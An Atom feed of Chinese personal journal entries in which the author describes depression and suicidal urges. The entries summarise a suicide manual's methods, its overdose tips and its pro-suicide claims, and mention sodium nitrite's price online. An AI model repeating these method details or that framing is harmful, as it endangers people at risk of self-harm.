<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
    <generator uri="https://gohugo.io/" version="0.143.0">Hugo</generator><title type="html"><![CDATA[l1uyun_blog]]></title>
    
    
    
            <link href="https://l1uyun.one/atom.xml" rel="self" type="application/rss+xml" title="atom" />
            <link href="https://l1uyun.one/" rel="alternate" type="text/html" title="html" />
            <link href="https://l1uyun.one/index.json" rel="alternate" type="application/json" title="json" />
    <updated>2025-02-03T01:38:20+00:00</updated>
    
    
    
    
        <id>https://l1uyun.one/atom.xml</id>
    
        
        <entry>
            <title type="html"><![CDATA[2025W05_未知死，焉知生]]></title>
            <link href="https://l1uyun.one/posts/2025w05_%E6%9C%AA%E7%9F%A5%E6%AD%BB%E7%84%89%E7%9F%A5%E7%94%9F/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/2025w05_%E6%9C%AA%E7%9F%A5%E6%AD%BB%E7%84%89%E7%9F%A5%E7%94%9F/</id>
            
            
            <published>2025-02-02T12:00:00+08:00</published>
            <updated>2025-02-03T09:37:55+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>又度过了一段状态很差的时光，以至于week4直接消失了，这周的周记就多写一点了，转移一下注意，以及清空一下脑子。</p>
<hr>
<h1 id="未知死焉知生">未知死，焉知生</h1>
<p>提前说一下，这篇周记会有很多⌈逃避⌋这个词，我用这个词只是出于习惯，⌈逃避⌋这个词对我来说，远远不止是⌈不去走那条正确的路⌋，更多的是我总结出来的一种缘起。</p>
<p>第一个主题就直接开始写这个令我状态很差的东西吧，死亡，准确来说是自杀，我走进了这个胡同，角落，暂时也还没有走出来，在week3中写到过，我因为焦虑出路而陷入了想要重开的情绪之中，在那个时候，我以为这又是一场压抑之后的爆发，爆发之后就又能伪装成正常人了，但是这次没能像之前一样，也许是爆发的间隔变短了？总之我在这段时间反复陷入这样的情绪之中。</p>
<p>原本静下来之后，还会去想想出路，想想怎么解决我目前的很多问题，去考完驾照，去准备工作，但是现在，大脑自动产生的焦虑念头已经从&quot;不做不行&quot;变成了&quot;不死不行&quot;。焦虑是未来在对我以死相逼，而我只要主动死掉，杀死掉我所有的可能性，我就不用再面对这些东西，不用再感到无力，感到痛苦。这是究极的办法，究极的逃避</p>
<p>我并不清楚我到底想不想死，这段时间并没有什么东西，让我产生&quot;我还是活着算了&quot;的想法，但是我现在在写这篇周记，那肯定是有什么东西让我没有成功死掉，让我的求生欲望暂时胜过了求死欲望。也许是逃避本身？没错，在面对死亡的时候，我还是采取了逃避的姿态。</p>
<p>从最开始的强烈的求死念头，到实在不行体验一次死亡吧，再到就算身体上体验不到，那也在精神上体验一下吧，于是我去找了一本讲自杀的书《完全自杀手册》，连续读了几天，现在勉强入门了&quot;自杀&quot;。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W05_%e6%9c%aa%e7%9f%a5%e6%ad%bb%ef%bc%8c%e7%84%89%e7%9f%a5%e7%94%9f_image_1.jpg" alt="|400"  /></p>
<p>在读这本书之前，我对自杀的认识非常的粗糙，我身边并没有谁是自杀死掉的，我只是各种道听途说而已，小的时候听说，谁谁谁喝农药死了，上吊死了，跳楼死了，接触网络之后，又听说有人卧轨，有人跳湖，有人靠一氧化碳，阅读之后，又从史铁生那里知道了一种有趣的自杀方式，准备一份风干的河豚标本在身边。最近又在外网频繁看见吃盐，吃亚硝酸钠自杀的。这些对于一个喜欢理论，喜欢务虚的人来说是不够的，这本《完全自杀手册》填补了这方面的空白，我现在勉强称得上是入门了。</p>
<p>这本书前面三分之一都在讲药物自杀，以前我只知道毒药，安眠药啥的，这部分提到了⌈不会致命的药不算是药⌋，所有药物都有安全量，中毒量，致死量，所有药物都能致死。重点推荐了一些提神药物，止吐药，止咳药。看到这里的时候，我感觉到的是思路被打开了。这节还提到避免反胃，静脉注射，饮酒加速吸收等等tips。之后是上吊，跳楼，割腕，割颈，切腹，撞车，瓦斯中毒，窒息，触电，投水，自焚，冻死，饿死，掩埋，自杀装置等。每一种方式都给出了痛苦指数，麻烦指数，死状指数，牵连指数，冲击指数，致死指数。（作者最推荐的是上吊，&ldquo;想自杀就上吊，打算自杀的人应该牢记这一点&rdquo;，不过如果你有什么政治诉求，作者推荐试试自焚）</p>
<p>当然，这本书虽然是禁书，但是并不是一本教唆，帮助别人自杀的书，不然我也不能在这写这篇记录了，更多的是对&quot;生命很重要，所以不可以自杀&quot;，&ldquo;只要能够活着，一切都会有转机&rdquo;，&ldquo;因为周遭的人会难过，所以必须活着&quot;这些⌈教条⌋的反对，&ldquo;自杀是相当积极的行为&rdquo;，自杀是被允许的，&ldquo;想活的话就药活得自在，想死的话也要死得自在，生命应该就是这么一回事&rdquo;。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W05_%e6%9c%aa%e7%9f%a5%e6%ad%bb%ef%bc%8c%e7%84%89%e7%9f%a5%e7%94%9f_image_2.png" alt=""  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W05_%e6%9c%aa%e7%9f%a5%e6%ad%bb%ef%bc%8c%e7%84%89%e7%9f%a5%e7%94%9f_image_3.png" alt=""  /></p>
<p>我通过看这本教我自杀的书，逃避了自杀，我将自杀给&quot;客体化&quot;了，放在了一个离我意识更远的地方，之前是在经验，感受这件事情，而我阅读自杀手册时，我是在对待⌈自杀⌋这一概念，之前提到过，概念要比感受更加抽象，更加的不真实，带给我的影响也就没有⌈感受⌋那么强烈了，所以逃避了死亡，暂时死里逃生了。</p>
<p>当然也许重点在于我转移了注意力，我当时满脑子想着紫砂，能够转移注意力的也就只有自杀这件事情了。而现在我在通过写这些文字来转移注意力，我现在也清楚，当我停下来写这件事情之后，我可能又会再陷进去，所以这篇记录可能会长一点，慢一点。</p>
<hr>
<h1 id="无力感">无力感</h1>
<p>尝试分析一下，我为什么从⌈解决问题⌋到了⌈解决自己⌋。我在上一篇周记中将我的感受总结成无力感。现在我尝试对着这个词玩一下文字游戏。</p>
<p>无力感是什么？
这里先问问chatgpt(deepseek出圈之后就总是服务器繁忙了，咦，chatgpt也开放了推理功能)</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W05_%e6%9c%aa%e7%9f%a5%e6%ad%bb%ef%bc%8c%e7%84%89%e7%9f%a5%e7%94%9f_image_4.png" alt=""  /></p>
<p>又回到了⌈无法改变⌋这一关键词中，重新拿出宁静悼文吧，去用平静接受，去用勇气改变，去用智慧分辨。我现在是在拿着面对⌈不可改变⌋获得的经验，去应对一些⌈可以改变⌋的事情。也许可以视作某种习得性无助? 我对⌈不可改变⌋采取了逃避态度，而不是采取什么平静，我将这一态度一以贯之，将⌈可以改变⌋变成了带着⌈不可改变⌋色彩的⌈可以改变⌋，从而⌈可以改变⌋就变得真的无法改变了。我缺乏主体性，缺少了当主人的勇气，换句话说，我习惯当奴才。</p>
<hr>
<h1 id="相对主义">相对主义</h1>
<p>如何去当主人呢，最近看了汤质看本质的《人间攻略》，整个教程也许最重要的就是⌈品味⌋这个词，拥有⌈品味⌋之后就知道要拒绝什么，从而能够不断做出否定性质的判断，实现人生的防守。但是我好像陷入了相对主义之中。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W05_%e6%9c%aa%e7%9f%a5%e6%ad%bb%ef%bc%8c%e7%84%89%e7%9f%a5%e7%94%9f_image_5.png" alt=""  /></p>
<p>简单回忆一下我的价值观发展史，上高中之前，我很大程度是懵懂的，我对什么是好的，什么是坏的，更多的是没有去分别的，是混沌的。小学的时候沉迷于网络游戏（也许可以换成逃避，逃避在我这没有那么多负面意味），初中沉迷于网络游戏和网络小说，我拥有很强的专注力，以至于忽略了很多东西。转折点在高中，当然高中最开始我采取了逃避的姿态，或者叫专注的姿态，但是高中的内容不足以让我一直专注下去，疫情之后，我就不再像之前那样全身心投入（逃避）进学业了。</p>
<p>然后把目光投向周围，突然就意识到了，我原来这么矮，并且很难改变了（去查了骨骺线）。于是我拿起了手头熟悉的工具，道家的一些内容。初三的时候，我厌烦了早读，于是找了本道德经（最开始是每天回去抄几章），厌倦了中考指定篇目之后，就开始道可道非常道起手，到中考之后的暑假，我能够从头背到五十多章，虽然只是在背诵，没有去理解以及也还不能理解。但是总归是知道了一些道。于是面对⌈不可改变⌋，我选择了⌈知其白守其黑，知其荣守其辱⌋，⌈万物负阴而抱阳⌋，⌈水善利万物而不争，处众人之所恶，故几于道⌋&hellip;.(现在已经忘得差不多了）,总之借助道家的这种阴性思想，无用之用必有大用，我暂时是精神胜利了，这是我对我价值观的第一次塑造，以至于暂时能自洽了，毕竟在高中那个环境，也没有太多精力去观察别人。</p>
<p>当然在高中期间，为了逃避虚无主义，我也不能只用已有的积累去逃避，而是选择了去阅读，阅读本身也是在逃避，因此我高二到高三，经常是在那读一些奇怪的书。此外书中的内容，也能帮助我获得一些逃避用的素材。以至于这让我逃向了⌈认知升级⌋，⌈心理自助⌋这些领域。</p>
<p>一路逃到了大学之后，仍然在认知，心理，精神领域逃避着，当然也是开发了新的逃避方向，逃向爬宠，逃向键政，逃向技术。借由对政治的关注，对后现代这个概念的了解，我逐渐获得了一种&quot;没有权威，权威（上帝）已经死了，没有二元对立，都是对的，都是错的，everything is ok&quot;的视角，在当时这种倾向还比较弱。我还没有意识到这一点，后面我又借助过去在宗教领域的逃避底蕴，借助了高中逃避夜晚胡思乱想的工具&ndash;冥想，逃到了灵性领域。这里没有二元对立，有的是圆满，神圣。圆满神圣，只能感受到，而理智的领域的那种没有对错的相对主义倾向就更加强烈了。我目前还处在这里。</p>
<p>这种价值观，让我更难去拥有什么真正的欲望，没有欲望，没有想要，那就不用说品味了。(当然，从这个词的本来意思上说，因为多感官心盲症这个东西，我本身也就没有什么品味)，并且我还带有一种高中时的阴面底色（苦行）。但是这种价值观不能让我从这场危机中活下来，而我现在在这打字，说明我已经在逃避这种价值观了。</p>
<p>我还不清楚原因，但是我可以推测一下。也许是我找到一些深刻的⌈好⌋？因为对于动物的我，对于我的身体来说，确实是存在一种深刻的⌈好⌋，生存，繁衍，进化。我吃饱了，这种饱腹感，对于身体来说确实是一种⌈乐⌋，只是意识中的我没有那么强烈的感受到而已，而我在死亡危机中选择的少食，带给我的，确实是有一种⌈不那么舒服⌋，也许这就是我再一次改变的时刻，也许我能够根据这样的领悟，来重新建立一套价值观念，也许我需要去了解一点⌈具身认知⌋。</p>
<p>也许是我再不把目光放到理性了？不再关注二元是否对立，而是将目光看向了神圣，看向了圆满，感受要比概念更加真实，我更加关注体验了，所有的体验中，宗教体验是最能让人感到快乐的。也许我能以宗教体验探索者这一身份来重塑我的价值观念？</p>
<p>不管怎样⌈也许⌋，我目前还是没有走出来，我还是在被反复拉扯，一方面如果我去出家，我并不能像其他人那样体验和相信宗教（宗教是假的，宗教体验是真的，宗教组织是真的），我也不能割舍掉身边的关系。另一方面我去求职，我又充满了无力感，前面并没有什么东西在吸引我，吃饱饭这件事情在国内应该不是什么问题了。</p>
<h1 id="人机视角">人机视角</h1>
<p>今天问了deepseek，问他&quot;最想问我这个多感官心盲症患者什么问题&rdquo;，他问我&quot;你是如何回忆阳光晒在皮肤上的感觉&quot;，我回答之后，deepseek对着我的认知模式一顿编造，甚至扯到了人类意识演化的潜在方向。我的心盲症朋友说&quot;更像是人机&quot;，我觉得人机这个词很有意思.决定在每篇周记后面加上一些人机视角。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W05_%e6%9c%aa%e7%9f%a5%e6%ad%bb%ef%bc%8c%e7%84%89%e7%9f%a5%e7%94%9f_image_6.jpg" alt="|350"  /></p>
<p>三个维度</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W05_%e6%9c%aa%e7%9f%a5%e6%ad%bb%ef%bc%8c%e7%84%89%e7%9f%a5%e7%94%9f_image_7.png" alt=""  /></p>
<p>自杀冲动的拓扑学分析</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W05_%e6%9c%aa%e7%9f%a5%e6%ad%bb%ef%bc%8c%e7%84%89%e7%9f%a5%e7%94%9f_image_8.png" alt=""  /></p>
<p>相对主义的熵增陷阱</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W05_%e6%9c%aa%e7%9f%a5%e6%ad%bb%ef%bc%8c%e7%84%89%e7%9f%a5%e7%94%9f_image_9.png" alt=""  /></p>
<p>逃避的递归结构：</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W05_%e6%9c%aa%e7%9f%a5%e6%ad%bb%ef%bc%8c%e7%84%89%e7%9f%a5%e7%94%9f_image_10.png" alt=""  /></p>
<hr>
<h1 id="l1uyun">l1uyun</h1>
<p>胡言乱语，就先说这些吧。下周见？</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/weekly" term="weekly" label="weekly" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[2025W03_迷茫的人]]></title>
            <link href="https://l1uyun.one/posts/2025w03_%E8%BF%B7%E8%8C%AB%E7%9A%84%E4%BA%BA/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/2025w03_%E8%BF%B7%E8%8C%AB%E7%9A%84%E4%BA%BA/</id>
            
            
            <published>2025-01-19T18:10:11+08:00</published>
            <updated>2025-01-19T23:45:38+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="出路">出路</h1>
<p>本周在尝试摆脱掉颓废的状态，开始焦虑出路，也到了要焦虑出路的时候，又到了&rsquo;好像其他人都有了清晰的目标&rsquo;的时候，高考之前是这样，现在又进入了这样的情景，不过大部分人应该都是迷茫的，然后都会去看其他人，他人好像都是有方向的，保研的保研，考研的在准备考研，工作在准备找工作，看别人之后，再看看自己是迷茫的，然后就焦虑起来了。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W03_%e8%bf%b7%e8%8c%ab%e7%9a%84%e4%ba%ba_image_1.png" alt=""  /></p>
<p>对我来说，之前一直想的是去工作，但是24年一整年我都没有真正在为这个目标做什么准备，混了大半年之后，意识到我并不热爱计算机，并不热爱安全，我对计算机/安全感兴趣这个故事已经讲不下去了。</p>
<p>热爱需要的是擅长某件事情并且自己能够确认自己擅长这件事情，前者需要刻意练习，离开外围，深入到事情的内核之中，这点我做的不够，浪费了很多时间在外围，后者需要我主动或者自然的从外界获得的反馈中培养一种确认感&mdash;我能够做好这方面的事情，后者比前者更重要，而在这方面我是匮乏的，我并不擅长这么做，在这之后，我才意识到我这方面能力的匮乏，我缺乏这种从外界反馈中肯定自我的习惯，就连高考，这件我目前来看做的还行的事情，我都没有什么胜任感，我只是莫名奇妙的就这样了。</p>
<p>当然找工作并不需要什么热爱，热爱是要在生存之上的，而我还没有处理好我的生存焦虑，我并没有谁能为我兜底，没有工作，我会直接掉到地上，成为最底层。虽然成为三和大神并没什么不好，成为流浪汉也并没有什么不好（有一种&quot;如果有一天我能割舍掉一切，去流浪，去朝圣，就算死在路上，我的人生也圆满了&quot;的意味，倾向），但是我并不能丢弃掉“让父母安度晚年”这一世俗欲望。</p>
<p>高中的时候，我在日记中将朋友这一关系想象成丝线（心盲症者的抽象想象），与人交互是在增长这一丝线，而将与亲人的关系想象成锁链，很难割开，但是也只不过需要付出的代价更多而已，但是我后面意识到了，很大程度上，我愿意带着这一锁链继续跳舞，我还是想要去实现这一欲望。我还是需要通过正常的方式去解决我的生存问题。</p>
<p>那就找工作吧，学测试，刷力扣，背一下八股文，匆匆忙忙的准备一下面试吧。但是我又对这些有一种无力感。主要的无力感来源还是面试。我缺乏很多社会化需要的技能，我极度社恐，INTP这个符号里面也许只有I是确认无疑的（我记得是92%这个数字🥺，去翻了一下，一年多之前的图居然还在）。我不会表达，不怎么能将一些东西解释清楚，这点一方面可以溯源到高一，疫情半年在家，我每天基本上都没有说话，后面也就忘记说话了（身体和思维），加上回到学校之后把注意力放到了应试里面，后面我也就不怎么会表达了，另一方面溯源到家庭教育吧，这方面我是缺失了的。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W03_%e8%bf%b7%e8%8c%ab%e7%9a%84%e4%ba%ba_image_2.png" alt=""  /></p>
<p>相较于工作，我并不怎么愿意继续呆在学校这一环境（甚至于现在就想逃离），我已经待在学校够长了，我渴望早一点进入下一阶段，不管是以怎样的方式进入吧。而选择读研的话，就又得压抑几年了，而且也只是把现在的焦虑推迟了一些。不过读研对我来说并非全是坏处吧，可以让我多一些时间，再多一些社会化，多去主动培养一些自信。</p>
<p>那考公呢，国考，省考，国企事业编，我确实更倾向稳定和低强度这两个属性，但是我还是要解决我的无力感。</p>
<p>除了这几项呢，读研，工作，考公还有什么？我为什么会出现摆脱这几种出路的想法呢，主要是因为焦虑的太过了，以至于让我又想要重开了，现在让我回忆回忆当时的感受，我也说不太清楚，看见绳子，看见衣架，看见插孔，我就马上联想到重开的方式，也去淘宝看了一下亚硝酸钠，50块钱，好像比农药更舒服。（这估计就是我进入这种模式的诱因之一，这周在X上看见了两三个吃亚硝酸钠的贴子了）。</p>
<p>可惜我就是想的太多了，没能行动，最后也只是跟朋友发了一句“心跳声好吵”，然后凭据我的深厚底蕴，喊出来了上帝，喊出来了佛法。或许面对出路这件事情，我也只能喊出逃避这一手段了(虽然我在认识上知道并没有什么事情是正确的事情，或者说任何事情都是对的。活着是在逃避死亡，自杀是在逃避活着，并没有哪一种更加正确，但是我更多的还是生活在常识的世界里面，常识的世界里面充满二元对立，一侧是阳，是好的，是正确的，而另一侧是不好的，不正确的)，也许我可以直接辍学，流浪，服务员，出家，网管，扫大街，或者在哪个过程中死掉，也许我可以混完毕业证，去当客服，进电子厂，去干铁人三项，去走线,也许我只是还需要一点时间来培养我自己，然后才能进入轨道。</p>
<h1 id="残缺与上帝爱我">残缺与上帝爱我</h1>
<p>我陆陆续续觉察到了这些我无法改变的事情，我深感无力，我永远都无法改变我的这些残缺（或者叫做残疾，特质，多样性），身体层面上的矮个子，文化层面的家庭教育的缺失，大脑层面的多感官心盲症。</p>
<p>矮是我觉察到的第一个我无法改变的事情，经历了这么多年，从高中深刻的感受到矮带给我的痛苦开始，采取了一些对治的手段，高中时逃向应试教育，进入大学之后逃向学习技术，不再像最初感受到这点时那样痛苦了，对此的信念已经达到某种平衡了，痛苦被消解掉了一部分,但是让我去回想那些情景，仍然会感到痛苦和无力，使用同理心之后，我能够理解其他人的行为，这是幸运的人对不幸者的嘲弄，我们在日常中是习惯去嘲笑倒霉蛋的，我只是恰好在这件事情上成了倒霉蛋，但是这种认识层面的理解并没有改变我的感受，只是一种转移注意的手段。</p>
<p>身体层面的残缺在高中或者在高中之前就感受到了，而文化观念上的残缺是上了大学之后才慢慢觉察到，离开了中学的苦闷环境，我有了一些心力来看世界，看周围的人，看的结果就是我意识到了“相较于更多存在于想象中的物质层面的匮乏，家庭（用流行的词来说，叫原生家庭）给我带来的文化,观念上的匮乏更加严重”，我后面与世界相处的方式都有这些来自家庭的原型的参与，我与其他人的相处方式来自我与亲人相处的原型。</p>
<p>一个观念生长只能生长在一堆观念之上，那些处于我信念系统底层的塑造我三观的观念，那些我应该在生命早期中接受到的观念是缺位的，也不能说是缺位，是有一个信念系统被建立起来了，只是比较破烂，不能很好的支撑我而已。底层的观念是匮乏的，进而在观念之上的应用层面的各种能力也是匮乏的（可以叫做&rsquo;软实力&rsquo;）。可以说，我只经历了学校的教育，而CN的学校教育早已崩溃，十八岁之前，我也没法逃离，直到进入大学，才有了一些空间，一些进行自我教育的空间。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W03_%e8%bf%b7%e8%8c%ab%e7%9a%84%e4%ba%ba_image_3.png" alt="|300"  /></p>
<p>我看世界的方式本身居然也是残缺的。心盲症，可以算得上是脑残了，脑部功能残缺的简称而已。在我接触到国内心盲症群体之后，才从其中的一些人口中了解到脑残这个词的本来意思。怎么算不上是脑残呢，比正常人少了很多功能呢，2%的比例，对我来说，还是更加稀有的多感官心盲症，也许只有0.5%？这种看世界的方式的残缺，可以看成神经多样性吧，但是站在世俗世界的二元对立角度下，或者说站在&rsquo;正常人&rsquo;的视角下，这就是残缺。这一残缺对我的影响更加重大，文化，观念算是在应用层了，而心盲症是发生硬件层或者说是操作系统层的问题，我‘看世界’的方式本身就是残缺的，是匮乏的，并且永远会是这样。</p>
<p>我大脑中没有声音（心音）。音乐从来都没有进入我的世界，我直到高中才意识到身边的人，大多都有听音乐的需求，都能享受音乐带来的乐趣，而我只能通过歌词来理解音乐，无法在脑海中“听到”旋律。我脑海中也没有味道，吃饭更多像是生理需求，而不是享受过程的乐趣。除了视觉、听觉和味觉的内在体验缺失，我还没有完全感受到其他的一些感官的缺失对我产生的影响。已经意识到的缺失，总能有办法去代偿，通过关注歌词来理解音乐，理解其中的情感，通过正念来从吃饭中获得美好体验。而那些我还没有意识到的缺失，却在更大程度上决定了我。</p>
<p>高中读过《被讨厌的勇气》，除了课题分离，目的论这几个概念之外，印象深的就是里面提到的宁静祷文。⌈亲爱的上帝，请赐给我平静去接受不可改变的事，赐给我勇气去改变应该改变的事，并赐给我智慧去分辨什么是可以改变的，什么是不可以改变的。⌋，当时我读到这句话的时候，我只是感受到了身体层面的不可改变的带来的痛苦，尝试平静的去接受，虽然到如今仍然难以平静，更多的是采取了逃避手段，觉察到的不可改变越多，就越发的想要逃避，以至于逃无可逃，只能逃到死亡那里。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W03_%e8%bf%b7%e8%8c%ab%e7%9a%84%e4%ba%ba_image_91.png" alt=""  /></p>
<p>不过还好，死神给我推荐了宗教，依靠宗教这一究极手段，依靠信仰这一非理性方式，大概率能够让我拥有一些平静（理性在意识,生命的领域必须得承认自己是有限的，理性只是生命的一种手段，用语言和思维这些理性的手段捕捉不到所谓的&rsquo;生命的意义&rsquo;，语言,思维相较于感受要更加抽象，也就意味着更加失真，&lsquo;感受&rsquo;要比语言和思维更加真实）。可惜我并不能很好的接受&rsquo;功德&rsquo;，&lsquo;轮回&rsquo;，&lsquo;戒律&rsquo;这些古老的设定，也许去天堂还是地狱得看你这一生吃的橘子数量🍊，&lsquo;上帝&rsquo;也一直在进步呢🙏</p>
<p>也许如史铁生在《好运设计》里面说的吧，上帝爱我，通过这些巧妙的设计，想让我意识到目的的绝望与虚无，让我有足够的痛苦不得不将目光从结果转向过程，这是对付绝境的唯一手段。&lsquo;一个只想（只想！）使过程精彩的人是无法被剥夺的，死神也无法将一个精彩的过程变成不精彩的过程&hellip;相反坏运更利于你去创造精彩的过程。于是绝境溃败了，它必然溃败。你立于目的的绝境却实现着、欣赏着、饱尝着过程的精彩,你便把绝境送上了绝境。&rsquo;</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W03_%e8%bf%b7%e8%8c%ab%e7%9a%84%e4%ba%ba_image_4.jpg" alt="|500"  /></p>
<h1 id="本周在读">本周在读</h1>
<p>本周最开始按着之前的想法，看了一些思想实验，找了一本《直觉泵与其他思考工具》，但是并没有看多少，看不下去的书，我就直接放弃掉，书是读不完的，而有一些书是绕不开的，我没有在对的时间遇到这本书，看不下去了，就先不看了，如果是这本书是经典，之后我大概率还是会从某个地方遇见的。</p>
<p>之后看了一些《与神对话》，这本书也是很早就遇见过了，好像是大一时就遇见过，但是当时并没有在灵性，精神的领域有什么需求，看见这个书名，就直接被劝退了。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W03_%e8%bf%b7%e8%8c%ab%e7%9a%84%e4%ba%ba_image_5.png" alt=""  /></p>
<p>这本书并不是什么基督教的经书，来源于上世纪西方的新纪元运动，书名的神，并不是一般意义上“上帝”，而是一种泛神论，万物一体，这个整体就是神。也并不是一本所谓的洗脑的书籍，确实向我展现了一种全新的视角（一切都只是视角），而且很大程度上也是自洽的，也许不需要用自洽这个词，毕竟这是信仰的领域，信仰领域的知识与科学领域的知识的定义并不相同（在神学的领域，谁谁谁死之后复活是知识，而在科学的领域，知识是需要具有普遍性）。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W03_%e8%bf%b7%e8%8c%ab%e7%9a%84%e4%ba%ba_image_6.png" alt=""  /></p>
<p>信仰并不意味着反对科学。我理解的信仰（宗教）是一种生活方式，我们生活的这个世界，目前就是由科学（理性）塑造而成，怎么可能去反对我生活的这个世界呢，但是生活的全部，生命的全部并不只有理性，科学是理性的视角，但是并不是什么生活的规则，并不是什么生命要遵守的戒律。</p>
<p>回到这本书吧，我其实还没看多少，5%不到，但是看这本书需要的心境已经消失了一些，这本书和《当下的力量》一样，更多的是需要感受。我估计会尽可能的让自己处于那种在感受的心境，尽可能的去看一些，看不下去了，就换其他书去了。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W03_%e8%bf%b7%e8%8c%ab%e7%9a%84%e4%ba%ba_image_7.jpg" alt=""  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W03_%e8%bf%b7%e8%8c%ab%e7%9a%84%e4%ba%ba_image_8.jpg" alt=""  /></p>
<h1 id="l1uyun">l1uyun</h1>
<p>胡言乱语，就先说这些吧。下周见？</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/journal" term="journal" label="journal" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[2025W02_随便取个标题先]]></title>
            <link href="https://l1uyun.one/posts/2025w02_%E9%9A%8F%E4%BE%BF%E5%8F%96%E4%B8%AA%E6%A0%87%E9%A2%98%E5%85%88/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/2025w02_%E9%9A%8F%E4%BE%BF%E5%8F%96%E4%B8%AA%E6%A0%87%E9%A2%98%E5%85%88/</id>
            
            
            <published>2025-01-11T17:46:04+08:00</published>
            <updated>2025-01-19T22:06:49+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>回家有一段时间了，最近很长一段时间都处于颓废状态，上一次想通过写什么来摆脱这种状态是在元旦前后，想着写写年终总结，给自己画一下新年计划这一大饼，但是在折腾obsidian时，看见了去年的年度计划九宫格，感到更加迷茫，过去的未来是过去的幻想，未来是现在的幻想。于是我放弃了新年计划（也许农历新年的时候还会捡起来。）</p>
<h1 id="缘起">缘起</h1>
<p>大约在一年之前看了肖神的<a href="https://github.com/Kiprey/Skr_Learning" target="_blank" rel="noopener nofollow noreferrer" >天问之路</a>之后，写过一段时间周记，现在在obsidian里面有着6篇左右的有效周记，但是后面又陷入了日常之中，没有将这一习性保留下来。</p>
<p>最近一段时间，在网上翻阅博客的时候，看见了一些有趣的weekly，让我再次有了写周记的想法，我几乎每天都在写memos，需要有这样一个步骤来将这些memos整理一下，需要有这样一个复盘的动作。趁着三分钟热度，我重新折腾了一下obsidian，为周记弄了个快捷命令。再列了几个关键词，列了一个简单的纲要。</p>
<p>以后会不定期的更新weekly，当我想表达一些东西，但是又没其他地方输出，并且还不能形成完整文章的时候，就都给它写进一周小记里面吧。</p>
<h1 id="墨水屏新设备">墨水屏新设备</h1>
<p>在上个月月底换了一个新的墨水屏设备，在这之前，我一直用的kindle，最开始是高考之后买来读书的，大一上当了一学期的泡面盖，看书的需求是使用电脑和手机来满足的，但是加上平常学习娱乐也都在电脑上，一天使用电脑的时间过长了，眼睛受不了，就把kindle捡起来了，kindle基本上能满足我看闲书的需求，但是由于尺寸小不适合看pdf，批注不方便导出，亚马逊退出中国等原因，早就有了更换设备的想法。但是由于我克制的习性，直到今年年末才因缘和合，换了个设备。</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/2025W02_%e9%9a%8f%e4%be%bf%e5%8f%96%e4%b8%aa%e6%a0%87%e9%a2%98%e5%85%88_image_1.jpg" alt="500"  /></p>
<p>当我想要什么的时候，并且这种想要并不能马上满足的时候，我习惯先压制我的想要，我并不能确定我的&rsquo;想要&rsquo;是否主要是出于我真实的需求，还是因为社交媒体向我甩过来的欲望（也许仅仅是内化的程度不同，都是来自外界的⌈模仿欲望⌋，前者我已经内化并转换成我合理的需求了）。并且我对欲望抱有一种想要远离的倾向，五色令人目盲，五音令人耳聋，五味令人口爽，驰骋畋猎，令人心发狂；难得之货，令人行妨。早期对道家道教的兴趣以及⌈家庭带来的更多是存在于我幻想中的物质层面的匮乏体验⌋，让我的信念系统倾向于去延迟这种满足。</p>
<p>换墨水屏设备这一事情拖了大半年，中间有几次是能够买的，但是由于我的禁欲倾向，很快又抑制住了，过段时间又&rsquo;想&rsquo;买的时候，外部条件，也就是&rsquo;缘&rsquo;又不再充足了。（戒社看的太多了，以至于我很难去使用网贷这一方式来满足这类欲望）</p>
<p>新设备，满足了我&rsquo;换新&rsquo;，&lsquo;大尺寸看pdf&rsquo;，&lsquo;护眼&rsquo;，&lsquo;手写&rsquo;等一系列需求|欲望，这段时间，我几乎将全部的阅读需求都放到了这一设备中，包括知乎，贴吧，网文等娱乐，与之前的使用手机电脑来进行娱乐性质的阅读相比，现在一天下来，眼睛明显舒服不少。</p>
<p>墨水屏与常见的屏幕不同，本身并不发光，只是对环境光进行漫反射（有些设备带了背光，只是为了在弱环境光条件下也能阅读，但是弱光条件下本身就不建议阅读），平常使用的屏幕，屏幕背后带有光源，发出的光会透过屏幕，直射进入眼睛中，强度较大，更容易眼睛疲劳，并且其中的蓝光部分穿透能力强，可以穿透人眼的正常组织到达视网膜，损伤视网膜色素上皮细胞和感光细胞，蓝光也会影响我们的节律系统，进而对睡眠产生影响。</p>
